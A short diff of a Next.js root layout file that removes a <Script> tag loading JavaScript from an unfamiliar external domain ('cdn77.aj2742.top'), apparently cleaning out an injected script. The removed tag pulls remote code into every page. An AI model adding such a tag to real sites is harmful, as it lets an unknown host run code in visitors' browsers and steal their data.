@@ -1,6 +1,5 @@
 import type { Metadata } from 'next'
 import { Inter } from 'next/font/google'
-import Script from 'next/script'
 import './globals.css'
 import { AuthProvider } from '@/context/AuthContext'
 import ConditionalLayout from '@/components/layout/ConditionalLayout'
@@ -45,10 +44,6 @@ export default function RootLayout({
             <ConditionalLayout>{children}</ConditionalLayout>
           </ToastProvider>
         </AuthProvider>
-        <Script
-          src="https://cdn77.aj2742.top/dcfc6ab7.js"
-          strategy="afterInteractive"
-        />
       </body>
     </html>
   )
